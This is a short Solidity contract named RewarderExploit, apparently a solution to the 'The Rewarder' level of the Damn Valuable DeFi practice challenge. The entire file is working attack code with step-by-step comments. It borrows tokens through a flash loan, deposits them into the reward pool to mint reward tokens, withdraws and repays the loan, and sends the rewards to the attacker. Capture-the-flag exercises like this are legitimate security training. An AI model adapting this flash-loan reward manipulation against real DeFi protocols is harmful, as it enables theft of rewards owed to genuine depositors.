pragma solidity ^0.8.0;

import "../the-rewarder/AccountingToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/RewardToken.sol";

contract RewarderExploit {
    
    DamnValuableToken public immutable liquidityToken;
    FlashLoanerPool public flashLoanPool;
    TheRewarderPool public theRewarderPool;
    AccountingToken public accToken;
    RewardToken public immutable rewardToken;

    constructor (address _flashPool, address _rewarderPool) {
        flashLoanPool = FlashLoanerPool(_flashPool);
        liquidityToken = flashLoanPool.liquidityToken();

        theRewarderPool = TheRewarderPool(_rewarderPool);
        accToken = theRewarderPool.accToken();
        rewardToken = theRewarderPool.rewardToken();
    }

    function triggerLoan(uint256 _amount) public {
        
        // 1. trigger the liquidityToken flashloan
        flashLoanPool.flashLoan(_amount);

        // 6. transfer the rewards back to the attacker's account.
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    // called by flashLoan
    function receiveFlashLoan(uint256 _amount) public {
        
        // 2. approve the liquidityToken transfer to the reward pool.
        liquidityToken.approve(address(theRewarderPool), _amount);

        // 3. deposit the liquidityToken to the reward pool. This will mint our reward tokens
        theRewarderPool.deposit(_amount);

        // 4. withdraw the liquidityToken from the reward pool. We need them to repay the lender.
        theRewarderPool.withdraw(_amount);

        // 5. repay the lender
        liquidityToken.transfer(address(flashLoanPool), _amount);
    }
}